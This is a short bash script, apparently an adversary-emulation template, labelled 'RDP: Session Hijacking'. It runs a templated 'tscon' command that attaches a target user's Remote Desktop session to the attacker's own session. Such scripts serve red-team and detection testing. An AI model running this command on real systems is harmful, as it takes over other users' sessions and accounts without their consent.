#!/bin/bash

: '
RDP: Session Hijacking.
'

execute_command "tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}"
create_new_line
